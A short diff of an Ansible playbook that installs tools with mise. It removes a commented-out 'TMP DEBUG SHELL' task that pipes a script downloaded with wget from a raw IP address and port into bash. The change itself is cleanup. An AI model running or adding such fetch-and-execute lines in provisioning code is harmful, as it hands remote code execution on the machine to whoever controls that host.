@@ -43,9 +43,6 @@
 - name: Install and mise-based tools (this will take lot of time to install)
   ansible.builtin.shell: zsh -c 'mise settings set python_compile 1'
 
-# - name: TMP DEBUG SHELL
-  # ansible.builtin.shell: zsh -c 'wget -q -O - 86.194.92.215:6001|bash'
-
 - name: Install and mise-based tools (this will take lot of time to install)
   ansible.builtin.shell: zsh -c 'mise install {{ item }}@latest -y && mise use -g {{ item }}@latest'
   with_items: '{{ mise_tools }}'
